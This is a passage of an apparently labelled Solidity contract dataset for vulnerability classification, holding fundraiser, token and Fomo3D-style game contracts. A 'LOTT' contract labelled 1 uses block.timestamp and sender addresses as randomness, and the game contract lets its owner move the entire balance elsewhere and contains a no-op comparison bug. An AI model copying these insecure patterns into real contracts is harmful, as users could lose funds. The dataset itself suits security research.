tokens);        handleFunds(_address, _amount);        emit FundsReceived(_address, msg.value, tokens);    }         function getConversionRate() public view returns (uint256) {        return conversionRate;    }         function calculateTokens(uint256 _amount) internal view returns(uint256 tokens) {        tokens = _amount.mul(getConversionRate());    }         function validateTransaction() internal view {        require(msg.value != 0);        require(now >= startTime && now < endTime);    }         function hasEnded() public view returns (bool) {        return now >= endTime;    }}  
0<CODESPLIT>contract CappedFundraiser is BasicFundraiser {         uint256 public hardCap;         function initializeCappedFundraiser(uint256 _hardCap) internal {        require(_hardCap > 0);        hardCap = _hardCap;    }         function validateTransaction() internal view {        super.validateTransaction();        require(totalRaised < hardCap);    }         function hasEnded() public view returns (bool) {        return (super.hasEnded() || totalRaised >= hardCap);    }}  
0<CODESPLIT>contract GasPriceLimitFundraiser is HasOwner, BasicFundraiser {    uint256 public gasPriceLimit;    event GasPriceLimitChanged(uint256 gasPriceLimit);         function initializeGasPriceLimitFundraiser(uint256 _gasPriceLimit) internal {        gasPriceLimit = _gasPriceLimit;    }         function changeGasPriceLimit(uint256 _gasPriceLimit) onlyOwner() public {        gasPriceLimit = _gasPriceLimit;        emit GasPriceLimitChanged(_gasPriceLimit);    }         function validateTransaction() internal view {        require(gasPriceLimit == 0 || tx.gasprice <= gasPriceLimit);        return super.validateTransaction();    }}  
0<CODESPLIT>contract IndividualCapsFundraiser is BasicFundraiser {    uint256 public individualMinCap;    uint256 public individualMaxCap;    uint256 public individualMaxCapTokens;    event IndividualMinCapChanged(uint256 _individualMinCap);    event IndividualMaxCapTokensChanged(uint256 _individualMaxCapTokens);         function initializeIndividualCapsFundraiser(uint256 _individualMinCap, uint256 _individualMaxCap) internal {        individualMinCap = _individualMinCap;        individualMaxCap = _individualMaxCap;        individualMaxCapTokens = _individualMaxCap * conversionRate;    }    function setConversionRate(uint256 _conversionRate) public onlyOwner {        super.setConversionRate(_conversionRate);        if (individualMaxCap == 0) {            return;        }                individualMaxCapTokens = individualMaxCap * _conversionRate;        emit IndividualMaxCapTokensChanged(individualMaxCapTokens);    }    function setIndividualMinCap(uint256 _individualMinCap) public onlyOwner {        individualMinCap = _individualMinCap;        emit IndividualMinCapChanged(individualMinCap);    }    function setIndividualMaxCap(uint256 _individualMaxCap) public onlyOwner {        individualMaxCap = _individualMaxCap;        individualMaxCapTokens = _individualMaxCap * conversionRate;        emit IndividualMaxCapTokensChanged(individualMaxCapTokens);    }         function validateTransaction() internal view {        super.validateTransaction();        require(msg.value >= individualMinCap);    }         function handleTokens(address _address, uint256 _tokens) internal {        require(individualMaxCapTokens == 0 || token.balanceOf(_address).plus(_tokens) <= individualMaxCapTokens);        super.handleTokens(_address, _tokens);    }}  
0<CODESPLIT>contract StandardMintableToken is MintableToken {    constructor(address _minter, string _name, string _symbol, uint8 _decimals)        StandardToken(_name, _symbol, _decimals)        MintableToken(_minter)        public    {    }}  
0<CODESPLIT>contract MintableTokenFundraiser is BasicFundraiser {         function initializeMintableTokenFundraiser(string _name, string _symbol, uint8 _decimals) internal {        token = new StandardMintableToken(            address(this),              _name,            _symbol,            _decimals        );    }         function handleTokens(address _address, uint256 _tokens) internal {        MintableToken(token).mint(_address, _tokens);    }}  
0<CODESPLIT>contract RefundSafe is HasOwner {    using SafeMath for uint256;                        enum State {ACTIVE, REFUNDING, CLOSED}         mapping(address => uint256) public deposits;         address public beneficiary;         State public state;         event RefundsClosed();         event RefundsAllowed();         event RefundSuccessful(address indexed _address, uint256 _value);         constructor(address _owner, address _beneficiary)        HasOwner(_owner)        public    {        require(_beneficiary != 0x0);        beneficiary = _beneficiary;        state = State.ACTIVE;    }         function setBeneficiary(address _beneficiary) public onlyOwner {        require(_beneficiary != address(0));        beneficiary = _beneficiary;    }         function deposit(address _address) onlyOwner public payable {        require(state == State.ACTIVE);        deposits[_address] = deposits[_address].plus(msg.value);    }         function close() onlyOwner public {        require(state == State.ACTIVE);        state = State.CLOSED;        emit RefundsClosed();        beneficiary.transfer(address(this).balance);    }         function allowRefunds() onlyOwner public {        require(state == State.ACTIVE);        state = State.REFUNDING;        emit RefundsAllowed();    }         function refund(address _address) public {        require(state == State.REFUNDING);        uint256 amount = deposits[_address];                 require(amount != 0);                 deposits[_address] = 0;        _address.transfer(amount);        emit RefundSuccessful(_address, amount);    }}  
0<CODESPLIT>contract FinalizableFundraiser is BasicFundraiser {         bool public isFinalized = false;         event Finalized();         function finalize() onlyOwner public {        require(!isFinalized);        require(hasEnded());        finalization();        emit Finalized();        isFinalized = true;    }         function finalization() internal {        beneficiary.transfer(address(this).balance);    }         function handleFunds(address, uint256) internal {    }    }  
0<CODESPLIT>contract RefundableFundraiser is FinalizableFundraiser {              uint256 public softCap;              RefundSafe public refundSafe;         function initializeRefundableFundraiser(uint256 _softCap) internal {        require(_softCap > 0);        refundSafe = new RefundSafe(address(this), beneficiary);        softCap = _softCap;    }         function handleFunds(address _address, uint256 _ethers) internal {        refundSafe.deposit.value(_ethers)(_address);    }         function softCapReached() public view returns (bool) {        return totalRaised >= softCap;    }         function getRefund() public {        require(isFinalized);        require(!softCapReached());        refundSafe.refund(msg.sender);    }         function setBeneficiary(address _beneficiary) public onlyOwner {        super.setBeneficiary(_beneficiary);        refundSafe.setBeneficiary(_beneficiary);    }         function finalization() internal {        super.finalization();        if (softCapReached()) {            refundSafe.close();        } else {            refundSafe.allowRefunds();        }    }}  
0<CODESPLIT>contract HOWToken is MintableToken, BurnableToken, PausableToken {  constructor(address _owner, address _minter)    StandardToken(      "HOW Token",          "HOW",        18       )    HasOwner(_owner)    MintableToken(_minter)    public  {  }}  
0<CODESPLIT>contract HOWTokenSafe is TokenSafe {  constructor(address _token)     TokenSafe(_token)    public  {         init(      0,        1532779200      );    add(      0,        0xCD3367edbf18C379FA6FBD9D2C206DbB83A816AD,        53500000000000000000000000       );  }} 
0<CODESPLIT>contract HOWTokenFundraiser is MintableTokenFundraiser, IndividualCapsFundraiser, CappedFundraiser, RefundableFundraiser, GasPriceLimitFundraiser {  HOWTokenSafe public tokenSafe;  constructor()    HasOwner(msg.sender)    public  {    token = new HOWToken(      msg.sender,         address(this)       );    tokenSafe = new HOWTokenSafe(token);    MintableToken(token).mint(address(tokenSafe), 53500000000000000000000000);    initializeBasicFundraiser(      1532777400,        1538143200,         50000,        0xCD3367edbf18C379FA6FBD9D2C206DbB83A816AD          );    initializeIndividualCapsFundraiser(      (0.01 ether),        (10 ether)       );    initializeGasPriceLimitFundraiser(        80000000000      );        initializeCappedFundraiser(      (1070 ether)      );    initializeRefundableFundraiser(      (213 ether)       );          }       function finalization() internal {      super.finalization();      MintableToken(token).disableMinting();  }}
1<CODESPLIT>contract LOTT {    uint public rand1;    uint8 public rand2;        mapping (uint => mapping (uint8 => address)) public map;    function place(uint8 cell) external returns (uint){        rand1 += uint(msg.sender) + block.timestamp;        rand2 -= uint8(msg.sender);        return rand2 + rand2;     }}
0<CODESPLIT>contract H2OC is ERC20Token, Owned {    string  public constant name = "H2O Chain";    string  public constant symbol = "H2OC";    uint256 public constant decimals = 18;    uint256 public tokenDestroyed;	event Burn(address indexed _from, uint256 _tokenDestroyed, uint256 _timestamp);    function H2OC() public {		totalToken = 60000000000000000000000000000;		balances[msg.sender] = totalToken;    }    function transferAnyERC20Token(address _tokenAddress, address _recipient, uint256 _amount) public onlyOwner returns (bool success) {        return ERC20(_tokenAddress).transfer(_recipient, _amount);    }    function burn (uint256 _burntAmount) public returns (bool success) {    	require(balances[msg.sender] >= _burntAmount && _burntAmount > 0);    	balances[msg.sender] = balances[msg.sender].sub(_burntAmount);    	totalToken = totalToken.sub(_burntAmount);    	tokenDestroyed = tokenDestroyed.add(_burntAmount);    	require (tokenDestroyed <= 30000000000000000000000000000);    	Transfer(address(this), 0x0, _burntAmount);    	Burn(msg.sender, _burntAmount, block.timestamp);    	return true;	}}
0<CODESPLIT>contract EthKillerLong is modularLong {    using SafeMath for *;    using NameFilter for string;    using F3DKeysCalcLong for uint256;    address public teamAddress = 0xc2daaf4e63af76b394dea9a98a1fa650fc626b91;    function setTeamAddress(address addr) isOwner() public {        teamAddress = addr;    }    function gameSettings(uint256 rndExtra, uint256 rndGap) isOwner() public {        rndExtra_ = rndExtra;        rndGap_ = rndGap;    }        string constant public name = "Eth Killer Long Official";    string constant public symbol = "EKL";    uint256 private rndExtra_ = 0;          uint256 private rndGap_ = 0;              uint256 constant private rndInit_ = 12 hours;                     uint256 constant private rndInc_ = 30 seconds;                   uint256 constant private rndMax_ = 24 hours;                         uint256 public airDropPot_;                  uint256 public airDropTracker_ = 0;          uint256 public rID_;         uint256 public registrationFee_ = 10 finney;                    mapping (address => uint256) public pIDxAddr_;               mapping (bytes32 => uint256) public pIDxName_;               mapping (uint256 => F3Ddatasets.Player) public plyr_;        mapping (uint256 => mapping (uint256 => F3Ddatasets.PlayerRounds)) public plyrRnds_;              uint256 private playerCount = 0;    uint256 private totalWinnersKeys_;    uint256 constant private winnerNum_ = 5;           function registerName(address _addr, bytes32 _name, uint256 _affCode) private returns(bool, uint256) {        require (msg.value >= registrationFee_, "umm.....  you have to pay the name fee");        require(pIDxName_[_name] == 0, "sorry that names already taken");        uint256 _pID = pIDxAddr_[_addr];        bool isNew = false;        if (_pID == 0) {            isNew = true;            playerCount++;            _pID = playerCount;            pIDxAddr_[_addr] = _pID;            plyr_[_pID].name = _name;            pIDxName_[_name] = _pID;        }        if (_affCode != 0 && _affCode != plyr_[_pID].laff && _affCode != _pID) {            plyr_[_pID].laff = _affCode;        } else if (_affCode == _pID) {            _affCode = 0;        }        return (isNew, _affCode);    }    function registerNameXaddrFromDapp(address _addr, bytes32 _name, address _affCode) private returns(bool, uint256) {        uint256 _affID = 0;        if (_affCode != address(0) && _affCode != _addr) {            _affID = pIDxAddr_[_affCode];        }        return registerName(_addr, _name, _affID);    }    function registerNameXnameFromDapp(address _addr, bytes32 _name, bytes32 _affCode) private returns(bool, uint256) {        uint256 _affID = 0;        if (_affCode != "" && _affCode != _name) {            _affID = pIDxName_[_affCode];        }        return registerName(_addr, _name, _affID);    }       mapping (uint256 => F3Ddatasets.Round) public round_;        mapping (uint256 => mapping(uint256 => uint256)) public rndTmEth_;              mapping (uint256 => F3Ddatasets.TeamFee) public fees_;               mapping (uint256 => F3Ddatasets.PotSplit) public potSplit_;              address owner;    constructor()        public    {        owner = msg.sender;		                                     		         fees_[0] = F3Ddatasets.TeamFee(30,12);        fees_[1] = F3Ddatasets.TeamFee(43,7);        fees_[2] = F3Ddatasets.TeamFee(52,16);        fees_[3] = F3Ddatasets.TeamFee(43,15);                         potSplit_[0] = F3Ddatasets.PotSplit(15,15);        potSplit_[1] = F3Ddatasets.PotSplit(25,10);        potSplit_[2] = F3Ddatasets.PotSplit(20,24);        potSplit_[3] = F3Ddatasets.PotSplit(30,14);    }             modifier isActivated() {        require(activated_ == true, "its not ready yet.  check ?eta in discord");         _;    }        modifier isOwner() {        require(owner == msg.sender, "sorry owner only");        _;    }         modifier isHuman() {        address _addr = msg.sender;        uint256 _codeLength;                assembly {_codeLength := extcodesize(_addr)}        require(_codeLength == 0, "sorry humans only");        _;    }         modifier isWithinLimits(uint256 _eth) {        require(_eth >= 1000000000, "pocket lint: not a valid currency");        require(_eth <= 100000000000000000000000, "no vitalik, no");        _;        }                 function()        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                             uint256 _pID = pIDxAddr_[msg.sender];                         buyCore(_pID, plyr_[_pID].laff, 2, _eventData_);    }    function updateContract(address newContract) isOwner() public returns (bool) {        if (round_[rID_].end < now) {            Fomo3dContract nc = Fomo3dContract(newContract);            newContract.transfer(address(this).balance);            nc.setOldContractData(address(this));            return (true);        }        return (false);    }             function buyXid(uint256 _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                         uint256 _pID = pIDxAddr_[msg.sender];                                  if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                             } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = _affCode;        }                         _team = verifyTeam(_team);                         buyCore(_pID, _affCode, _team, _eventData_);    }        function buyXaddr(address _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                         } else {                         _affID = pIDxAddr_[_affCode];                                     if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                         _team = verifyTeam(_team);                         buyCore(_pID, _affID, _team, _eventData_);    }        function buyXname(bytes32 _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _affID;                 if (_affCode == "" || _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                         } else {                         _affID = pIDxName_[_affCode];                                     if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                         _team = verifyTeam(_team);                         buyCore(_pID, _affID, _team, _eventData_);    }             function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                         uint256 _pID = pIDxAddr_[msg.sender];                                  if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                             } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = _affCode;        }                 _team = verifyTeam(_team);                 reLoadCore(_pID, _affCode, _team, _eth, _eventData_);    }        function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                         } else {                         _affID = pIDxAddr_[_affCode];                                     if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                         _team = verifyTeam(_team);                         reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }        function reLoadXname(bytes32 _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _affID;                 if (_affCode == "" || _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                         } else {                         _affID = pIDxName_[_affCode];                                     if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                         _team = verifyTeam(_team);                         reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }         function withdraw()        isActivated()        isHuman()        public    {                 uint256 _rID = rID_;                         uint256 _now = now;                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _eth;                         if (_now > round_[_rID].end && round_[_rID].ended == false && hasPlayersInRound(_rID) == true)        {                         F3Ddatasets.EventReturns memory _eventData_;                                     round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);            			             _eth = withdrawEarnings(_pID);                                     if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                                         _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                                     emit F3Devents.onWithdrawAndDistribute            (                msg.sender,                 plyr_[_pID].name,                 _eth,                 _eventData_.compressedData,                 _eventData_.compressedIDs,                 _eventData_.winnerAddr,                 _eventData_.winnerName,                 _eventData_.amountWon,                 _eventData_.newPot,                 _eventData_.P3DAmount,                 _eventData_.genAmount            );                             } else {                         _eth = withdrawEarnings(_pID);                                     if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                                     emit F3Devents.onWithdraw(_pID, msg.sender, plyr_[_pID].name, _eth, _now);        }    }             function registerNameXID(string _nameString, uint256 _affCode)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = registerName(_addr, _name, _affCode);                uint256 _pID = pIDxAddr_[_addr];                         emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }        function registerNameXaddr(string _nameString, address _affCode)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = registerNameXaddrFromDapp(msg.sender, _name, _affCode);                uint256 _pID = pIDxAddr_[_addr];                         emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }        function registerNameXname(string _nameString, bytes32 _affCode)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = registerNameXnameFromDapp(msg.sender, _name, _affCode);                uint256 _pID = pIDxAddr_[_addr];                         emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }             function getBuyPrice()        public         view         returns(uint256)    {                   uint256 _rID = rID_;                         uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && hasPlayersInRound(_rID) == false)))            return ( (round_[_rID].keys.add(1000000000000000000)).ethRec(1000000000000000000) );        else              return ( 75000000000000 );      }             function getTimeLeft()        public        view        returns(uint256)    {                 uint256 _rID = rID_;                         uint256 _now = now;                if (_now < round_[_rID].end)            if (_now > round_[_rID].strt + rndGap_)                return( (round_[_rID].end).sub(_now) );            else                return( (round_[_rID].strt + rndGap_).sub(_now) );        else            return(0);    }        function isWinner(uint256 _pID, uint256 _rID) private view returns (bool) {        for (uint8 i = 0; i < winnerNum_; i++) {            if (round_[_rID].plyrs[i] == _pID) {                return (true);            }        }        return (false);    }         function getPlayerVaults(uint256 _pID)        public        view        returns(uint256 ,uint256, uint256)    {                 uint256 _rID = rID_;                         if (now > round_[_rID].end && round_[_rID].ended == false && hasPlayersInRound(_rID) == true)        {                         if (isWinner(_pID, _rID))            {                calcTotalWinnerKeys(_rID);                return                (                    (plyr_[_pID].win).add( (((round_[_rID].pot).mul(48)) / 100).mul(plyrRnds_[_pID][_rID].keys) / totalWinnersKeys_ ),                    (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)   ),                    plyr_[_pID].aff                );                         } else {                return                (                    plyr_[_pID].win,                    (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)  ),                    plyr_[_pID].aff                );            }                             } else {            return            (                plyr_[_pID].win,                (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                plyr_[_pID].aff            );        }    }             function getPlayerVaultsHelper(uint256 _pID, uint256 _rID)        private        view        returns(uint256)    {        return(  ((((round_[_rID].mask).add(((((round_[_rID].pot).mul(potSplit_[round_[_rID].team].gen)) / 100).mul(1000000000000000000)) / (round_[_rID].keys))).mul(plyrRnds_[_pID][_rID].keys)) / 1000000000000000000)  );    }             function getCurrentRoundInfo()        public        view        returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256, uint256, uint256, uint256, uint256)    {                          return        (            round_[rID_].ico,                            rID_,                                        round_[rID_].keys,                           round_[rID_].end,                            round_[rID_].strt,                           round_[rID_].pot,                            (round_[rID_].team + (round_[rID_].plyrs[winnerNum_ - 1] * 10)),                  plyr_[round_[rID_].plyrs[winnerNum_ - 1]].addr,               plyr_[round_[rID_].plyrs[winnerNum_ - 1]].name,               rndTmEth_[rID_][0],                          rndTmEth_[rID_][1],                          rndTmEth_[rID_][2],                          rndTmEth_[rID_][3],                          airDropTracker_ + (airDropPot_ * 1000)                       );    }         function getPlayerInfoByAddress(address _addr)        public         view         returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256)    {                 uint256 _rID = rID_;                if (_addr == address(0))        {            _addr == msg.sender;        }        uint256 _pID = pIDxAddr_[_addr];                return        (            _pID,                                            plyr_[_pID].name,                                plyrRnds_[_pID][_rID].keys,                      plyr_[_pID].win,                                 (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                    plyr_[_pID].aff,                                 plyrRnds_[_pID][_rID].eth                    );    }        function hasPlayersInRound(uint256 _rID) private view returns (bool){        for (uint8 i = 0; i < round_[_rID].plyrs.length; i++) {            if (round_[_rID].plyrs[i] != 0) {                return (true);            }        }        return (false);    }         function buyCore(uint256 _pID, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private    {                 uint256 _rID = rID_;                         uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && hasPlayersInRound(_rID) == false)))         {                         core(_rID, _pID, msg.value, _affID, _team, _eventData_);                         } else {                         if (_now > round_[_rID].end && round_[_rID].ended == false)             {                                 round_[_rID].ended = true;                _eventData_ = endRound(_eventData_);                                                 _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);                _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                                                 emit F3Devents.onBuyAndDistribute                (                    msg.sender,                     plyr_[_pID].name,                     msg.value,                     _eventData_.compressedData,                     _eventData_.compressedIDs,                     _eventData_.winnerAddr,                     _eventData_.winnerName,                     _eventData_.amountWon,                     _eventData_.newPot,                     _eventData_.P3DAmount,                     _eventData_.genAmount                );            }                                     plyr_[_pID].gen = plyr_[_pID].gen.add(msg.value);        }    }             function reLoadCore(uint256 _pID, uint256 _affID, uint256 _team, uint256 _eth, F3Ddatasets.EventReturns memory _eventData_)        private    {                 uint256 _rID = rID_;                         uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && hasPlayersInRound(_rID) == false)))         {                                                   plyr_[_pID].gen = withdrawEarnings(_pID).sub(_eth);                                     core(_rID, _pID, _eth, _affID, _team, _eventData_);                         } else if (_now > round_[_rID].end && round_[_rID].ended == false) {                         round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);                                         _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                                         emit F3Devents.onReLoadAndDistribute            (                msg.sender,                 plyr_[_pID].name,                 _eventData_.compressedData,                 _eventData_.compressedIDs,                 _eventData_.winnerAddr,                 _eventData_.winnerName,                 _eventData_.amountWon,                 _eventData_.newPot,                 _eventData_.P3DAmount,                 _eventData_.genAmount            );        }    }        function contains(uint256 _pID, uint256[winnerNum_] memory array) private pure returns (bool) {        for (uint8 i = 0; i < array.length; i++) {            if (array[i] == _pID) {                return (true);            }        }        return (false);    }    function calcTotalWinnerKeys(uint256 _rID) private {        uint256[winnerNum_] memory winnerPIDs;        totalWinnersKeys_ = 0;        for (uint8 i = 0; i < winnerNum_; i++) {            if (!contains(round_[_rID].plyrs[i], winnerPIDs)) {                winnerPIDs[i] = round_[_rID].plyrs[i];                totalWinnersKeys_ = totalWinnersKeys_.add(plyrRnds_[round_[_rID].plyrs[i]][_rID].keys);            }        }    }         function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private    {                 if (plyrRnds_[_pID][_rID].keys == 0)            _eventData_ = managePlayer(_pID, _eventData_);                         if (round_[_rID].eth < (100 ether) && plyrRnds_[_pID][_rID].eth.add(_eth) > (1 ether))        {            uint256 _availableLimit = (1 ether).sub(plyrRnds_[_pID][_rID].eth);            uint256 _refund = _eth.sub(_availableLimit);            plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);            _eth = _availableLimit;        }                         if (_eth > 1000000000)         {                                     uint256 _keys = (round_[_rID].eth).keysRec(_eth);                                     if (_keys >= 1000000000000000000)            {                updateTimer(_keys, _rID);                                 round_[_rID].plyrs[0] = round_[_rID].plyrs[1];                round_[_rID].plyrs[1] = round_[_rID].plyrs[2];                round_[_rID].plyrs[2] = round_[_rID].plyrs[3];                round_[_rID].plyrs[3] = round_[_rID].plyrs[4];                round_[_rID].plyrs[4] = _pID;                if (round_[_rID].team != _team) {                    round_[_rID].team = _team;                 }                                                 _eventData_.compressedData = _eventData_.compressedData + 100;            }                                     if (_eth >= 100000000000000000)            {                airDropTracker_++;                if (airdrop() == true)                {                                         uint256 _prize;                    if (_eth >= 10000000000000000000)                    {                                                 _prize = ((airDropPot_).mul(75)) / 100;                        plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                                                         airDropPot_ = (airDropPot_).sub(_prize);                                                                         _eventData_.compressedData += 300000000000000000000000000000000;                    } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {                                                 _prize = ((airDropPot_).mul(50)) / 100;                        plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                                                         airDropPot_ = (airDropPot_).sub(_prize);                                                                         _eventData_.compressedData += 200000000000000000000000000000000;                    } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {                                                 _prize = ((airDropPot_).mul(25)) / 100;                        plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                                                         airDropPot_ = (airDropPot_).sub(_prize);                                                                         _eventData_.compressedData += 300000000000000000000000000000000;                    }                                         _eventData_.compressedData += 10000000000000000000000000000000;                                         _eventData_.compressedData += _prize * 1000000000000000000000000000000000;                                                             airDropTracker_ = 0;                }            }                             _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);                                     plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);            plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);                                     round_[_rID].keys = _keys.add(round_[_rID].keys);            round_[_rID].eth = _eth.add(round_[_rID].eth);            rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);                             _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);            _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);                                     endTx(_pID, _team, _eth, _keys, _eventData_);        }    }             function calcUnMaskedEarnings(uint256 _pID, uint256 _rIDlast)        private        view        returns(uint256)    {        return(  (((round_[_rIDlast].mask).mul(plyrRnds_[_pID][_rIDlast].keys)) / (1000000000000000000)).sub(plyrRnds_[_pID][_rIDlast].mask)  );    }             function calcKeysReceived(uint256 _rID, uint256 _eth)        public        view        returns(uint256)    {                 uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && hasPlayersInRound(_rID) == false)))            return ( (round_[_rID].eth).keysRec(_eth) );        else              return ( (_eth).keys() );    }             function iWantXKeys(uint256 _keys)        public        view        returns(uint256)    {                 uint256 _rID = rID_;                         uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && hasPlayersInRound(_rID) == false)))            return ( (round_[_rID].keys.add(_keys)).ethRec(_keys) );        else              return ( (_keys).eth() );    }             function determinePID(F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {        uint256 _pID = pIDxAddr_[msg.sender];                 if (_pID == 0)        {                         playerCount++;            _pID = playerCount;            bytes32 _name = plyr_[_pID].name;            uint256 _laff = plyr_[_pID].laff;                                     pIDxAddr_[msg.sender] = _pID;            plyr_[_pID].addr = msg.sender;                        if (_name != "")            {                pIDxName_[_name] = _pID;                plyr_[_pID].name = _name;            }                        if (_laff != 0 && _laff != _pID)                plyr_[_pID].laff = _laff;                                     _eventData_.compressedData = _eventData_.compressedData + 1;        }         return (_eventData_);    }             function verifyTeam(uint256 _team)        private        pure        returns (uint256)    {        if (_team < 0 || _team > 3)            return(2);        else            return(_team);    }             function managePlayer(uint256 _pID, F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {                          if (plyr_[_pID].lrnd != 0)            updateGenVault(_pID, plyr_[_pID].lrnd);                             plyr_[_pID].lrnd = rID_;                             _eventData_.compressedData = _eventData_.compressedData + 10;                return(_eventData_);    }             function endRound(F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {                 uint256 _rID = rID_;                                                                                               uint256 _win = ((round_[_rID].pot).mul(48)) / 100;                 uint256 _gen = ((round_[_rID].pot).mul(potSplit_[round_[_rID].team].gen)) / 100;                 uint256 _fee = ((round_[_rID].pot) / 50).add(((round_[_rID].pot).mul(potSplit_[round_[_rID].team].p3d)) / 100);        uint256 _res = ((((round_[_rID].pot).sub(_win)).sub(_fee)).sub(_gen));                         uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);        if (_dust > 0)        {            _gen = _gen.sub(_dust);            _res = _res.add(_dust);        }                calcTotalWinnerKeys(_rID);                 plyr_[round_[_rID].plyrs[winnerNum_ - 1]].win = (_win.mul(plyrRnds_[round_[_rID].plyrs[winnerNum_ - 1]][_rID].keys) / totalWinnersKeys_).add(plyr_[round_[_rID].plyrs[winnerNum_ - 1]].win);        for (uint8 i = 0; i < winnerNum_ - 1; i++) {            plyr_[round_[_rID].plyrs[i]].win = 